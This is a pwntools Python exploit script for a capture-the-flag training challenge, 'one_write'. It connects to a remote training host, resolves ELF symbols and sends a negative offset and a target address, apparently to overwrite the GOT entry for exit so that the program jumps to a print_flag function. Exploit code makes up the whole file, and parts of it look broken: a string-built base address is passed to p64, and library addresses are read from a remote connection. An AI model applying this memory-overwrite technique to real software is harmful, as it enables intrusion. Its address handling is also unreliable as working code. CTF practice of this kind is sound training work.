from pwn import *

CHALL_PATH = "./one_write"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
brva 0x16E9
c
"""

context.arch = "amd64"

c = remote('one-write.training.offensivedefensive.it', 8080, ssl = True)
#c = gdb.debug(CHALL_PATH, COMMANDS)

print_flag_offset = CHALL.symbols["print_flag"]
print(f"print_flag @: {print_flag_offset}")
magic_addr = CHALL.symbols["magic"]
print(f"magic @: {magic_addr}")
got_addr = CHALL.symbols["got.exit"]
print(f"got @: {got_addr}")
offset = magic_addr - got_addr
print(f"offset @: {offset}")
leak = c.libs()['/home/marcolino/OneDrive/MASTER/Off-Def/Challenges/one_write']
print(f"\nleak: {type(leak)}\n")
base_addr = hex(leak)[:10] + "531"
print(f"base #: {base_addr}")
#0x5d2b41a24000
print_flag_addr = base_addr + hex(print_flag_offset)



c.recvuntil(b'Choice: ')
#input("WAIT")
c.sendline(p64(3))
print("Choice done")

c.recvuntil(b'Offset: ')
#input("WAIT")
c.sendline((-96).to_bytes(8, byteorder="little", signed=True))
print("Offset done")

c.recvuntil(b'Value: ')
#input("WAIT")
c.sendline(p64(print_flag_addr))
print("Value done")


c.interactive()


#0x55555329 -> 1431655209

#addresses:
#choice = 0x7fffca233b10
#offset = 

